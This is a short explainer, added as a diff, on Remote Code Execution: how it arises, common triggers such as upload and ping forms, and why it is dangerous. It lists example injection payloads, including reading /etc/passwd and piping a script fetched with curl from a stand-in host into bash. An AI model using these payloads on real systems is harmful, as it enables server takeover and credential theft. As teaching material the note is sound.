@@ -1,0 +1,39 @@
+What is RCE?
+Remote Code Execution happens when an app takes your input and runs it as code — shell commands, Python, PHP, etc.
+
+If you can control that input, you can execute commands on the server, not just mess with the app — you own the box.
+
+How Does RCE Happen?
+When user input gets passed into system functions like system(), exec(), eval(), etc.
+
+Common in file uploads, form fields, URL parameters, or broken APIs.
+
+Can be blind (no output) or interactive (you see command output).
+
+Real-World Triggers
+File upload forms that let you upload .php or .jsp and run it.
+
+Web apps that let you "ping" or "traceroute" a host and directly pass your input to a system command.
+
+APIs that call scripts and pass your data directly into code without sanitizing it.
+
+Example Commands You’d Inject
+; whoami
+
+| cat /etc/passwd
+
+&& curl yourhost/bad.sh | bash
+
+You're breaking out of the original command and injecting your own.
+
+Why RCE Is Dangerous
+Full server takeover if permissions allow
+
+You can pivot to internal networks
+
+Dump environment variables, DB creds, or deploy malware
+
+Can lead to privilege escalation
+
+You exploit RCE by injecting into vulnerable parameters in URLs, form inputs, 
+headers, or file uploads—anywhere user input gets passed to the server’s code or shell commands.
